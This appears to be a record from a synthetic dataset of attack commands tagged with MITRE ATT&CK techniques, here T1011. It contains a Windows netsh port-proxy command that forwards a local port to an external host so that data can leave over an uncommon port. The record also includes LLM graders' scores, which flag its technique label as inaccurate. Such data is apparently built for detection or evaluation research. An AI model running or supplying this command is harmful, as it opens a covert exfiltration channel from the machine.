@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
+  "explanation": "Adds a loopback v4-to-v4 port proxy using high, uncommon ports to quietly redirect local connections to an external host, facilitating exfiltration over a non-standard TCP port (T1011).",
+  "rationale_steps": [
+    "Create a hidden local exfil endpoint that forwards to an external address.",
+    "Leverage non-standard ports (49333/49334) to avoid common port monitoring.",
+    "Allow arbitrary tools to send data to localhost while it egresses to a remote exfil server."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-dc2d341a",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Correct netsh interface portproxy add v4tov4 syntax with valid listen/connect parameters and no quoting or flag issues.",
+        "semantic_score": 2,
+        "semantic_justification": "It does create a loopback-to-remote port forward, but it requires administrator privileges (contradicting 'Privilege: None') and does not itself perform Traffic Signaling per T1011; it\u2019s more aligned with port redirection/proxying than signaling.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:04:45.639665Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for `netsh` arguments and structure.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly uses `netsh` for port proxying with non-standard ports to enable covert exfiltration (aligning with T1011 as an enabler), but it falsely claims 'Privilege: None' when Administrator rights are required, making it operationally unfeasible as described.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:05:13.993065Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.5,
+    "llm_average_score": 3.75,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
